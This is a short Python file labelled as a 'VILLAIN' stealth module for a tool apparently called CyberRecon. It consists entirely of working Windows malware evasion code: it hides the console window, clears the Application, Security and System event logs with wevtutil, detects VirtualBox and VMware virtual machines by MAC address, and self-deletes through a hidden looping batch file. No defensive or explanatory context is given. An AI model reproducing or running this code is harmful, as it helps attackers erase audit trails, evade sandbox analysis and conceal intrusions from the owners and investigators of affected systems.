# VILLAIN: CyberRecon stealth module
import os, subprocess, tempfile, ctypes

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def clear_event_logs():
    for log in ["Application", "Security", "System"]:
        subprocess.run(["wevtutil", "cl", log], capture_output=True)

def check_vm():
    import uuid
    mac = f"{uuid.getnode():012x}"
    return mac.startswith(("080027", "000c29"))

def self_destruct(exe_path):
    clear_event_logs()
    bat = os.path.join(tempfile.gettempdir(), "sd.bat")
    with open(bat, "w") as f:
        f.write(f'@echo off\n:loop\ndel "{exe_path}" >nul 2>&1\nif exist "{exe_path}" goto loop\n')
    subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)
    os._exit(0)
